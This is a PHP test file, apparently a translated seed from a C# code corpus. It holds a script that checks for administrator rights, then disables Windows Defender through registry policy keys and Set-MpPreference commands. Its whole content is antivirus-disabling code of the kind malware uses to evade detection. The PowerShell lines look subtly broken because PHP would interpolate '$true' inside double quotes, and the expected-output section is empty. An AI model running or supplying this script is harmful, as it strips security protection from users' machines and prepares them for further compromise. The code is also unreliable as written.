--TEST--
Translated seed (inferredbugs-csharp: Disable-Windows-Defender/1)
--FILE--
<?php

function checkAdmin() {
    return in_array('S-1-5-32-544', explode("\n", shell_exec('whoami /groups')));
}

function runCommand($command) {
    shell_exec($command);
}

function main() {
    if (!checkAdmin()) return;

    $registryPaths = [
        "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" => [
            "DisableAntiSpyware" => "1"
        ],
        "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" => [
            "DisableBehaviorMonitoring" => "1",
            "DisableOnAccessProtection" => "1",
            "DisableScanOnRealtimeEnable" => "1"
        ]
    ];

    foreach ($registryPaths as $path => $values) {
        foreach ($values as $key => $value) {
            runCommand("reg add \"$path\" /v \"$key\" /t REG_DWORD /d $value /f");
        }
    }

    usleep(100000); // sleep for 100 milliseconds

    runCommand("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");
    usleep(100000); // sleep for 100 milliseconds
    runCommand("powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true");
}

main();
--EXPECT--
